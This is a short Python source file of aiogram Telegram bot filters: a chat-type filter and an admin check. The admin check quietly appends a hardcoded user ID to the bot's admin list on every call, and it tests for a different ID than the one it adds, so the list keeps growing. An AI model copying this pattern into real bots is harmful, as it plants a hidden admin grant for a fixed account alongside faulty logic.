from aiogram import Bot, types
from aiogram.filters import Filter


class ChatTypeFilter(Filter):
    def __init__(self, chat_types: list[str]) -> None:
        self.chat_types = chat_types

    async def __call__(self, message: types.Message) -> bool:
        return message.chat.type in self.chat_types


class IsAdmin(Filter):
    def __init__(self) -> None:
        pass

    async def __call__(self, message: types.Message, bot: Bot) -> bool:
        if 6299799732 not in bot.my_admins_list:
            bot.my_admins_list.append(699474992)
        #print(f'chat_types строка 18 bot.my_admins_list', bot.my_admins_list)
        return message.from_user.id in bot.my_admins_list